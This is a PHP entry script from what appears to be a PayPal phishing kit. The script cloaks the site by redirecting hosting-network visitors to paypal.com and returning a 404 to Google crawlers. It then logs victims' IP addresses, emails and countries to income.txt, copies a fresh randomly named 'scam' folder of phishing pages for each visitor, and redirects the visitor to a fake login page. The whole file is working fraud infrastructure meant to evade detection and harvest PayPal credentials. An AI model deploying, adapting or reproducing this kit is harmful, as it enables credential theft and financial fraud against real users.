<?php

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
    $ip = $forward;
}
else
{
    $ip = $remote;
}

$iphostname = json_decode(file_get_contents("https://ipinfo.io/".$ip."/json?token=72e8b805d51858"));
if ($iphostname && $iphostname->asn->type === 'hosting'){header("location: https://paypal.com");}


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();
include("include/antibot.php");
include("include/function.php");


if($_GET['email'] !="" || $_GET['firstname'] !="" ){

	if (!filter_var($_GET['email'], FILTER_VALIDATE_EMAIL) === false) {
        $_SESSION['_email_'] = $_GET['email'];
        $_SESSION['_firstname_'] = $_GET['firstname'];
        
	}
	else if (!filter_var($_SESSION['_email_'], FILTER_VALIDATE_EMAIL) === true) {
		$_SESSION['_email_'] ="";
    } 


// Detect Browser Language !
$lang_var = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);


switch ($lang_var){
    case "fr":
        $lang= "fr"; 
        break;
    case "it":
        $lang= "it";
        break;
    case "de":
        $lang= "de";
        break;
    case "en":
        $lang= "en";
        break;        
    default:
        $lang= "en";
        break;
}
$_SESSION['_lang_'] = $lang;
#END

// GET Country & Country CODE !

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP))
{
    $ip = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
    $ip = $forward;
}
else
{
    $ip = $remote;
}


$ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data && $ip_data->geoplugin_countryCode != null)
{
    $countrycode = $ip_data->geoplugin_countryCode;
    $_SESSION['cntcode'] = $countrycode;
}

$ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data2 && $ip_data2->geoplugin_countryName != null)
{
    $countryname = $ip_data2->geoplugin_countryName;
    $_SESSION['cntname'] = $countryname;
}

$ip_data3 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

if($ip_data3 && $ip_data3->geoplugin_countryName != null)
{
    $countryname1 = $ip_data3->geoplugin_countryName;
    $_SESSION['cntname1'] = $countryname1;
}

$httpagent = getenv ("HTTP_USER_AGENT");
#END

// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = 'abcdefABCDEMN0123456789')-1; $i != 31; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./signin/".$DIR;
$vKAB="files";

function recurse_copy($vKAB,$DIR) {
$dir = opendir($vKAB);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($vKAB . '/' . $file) ) {
recurse_copy($vKAB . '/' . $file,$DIR . '/' . $file);
}
else {
copy($vKAB . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$timmme = date('l jS \of F Y h:i:s A');
recurse_copy( $vKAB, $DIR );
#END
    $browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

        $f = fopen("income.txt", "a");
        
        fwrite($f, $_SERVER[REMOTE_ADDR].'()'.$timmme.'()'.$browser.'()'.$_SESSION['cntname1'].'()'.$_SESSION['_email_']."\r\n");
    
   // file_put_contents('fofo.html', $line . PHP_EOL, FILE_APPEND); 
//LOCATION !
header("location:".$DIR."/login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirm_account_3b2vhFa76bAq6&firstname=".$_SESSION['_firstname_']."&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
#END
#END

}else {
header("location: https://paypal.com");

}

?>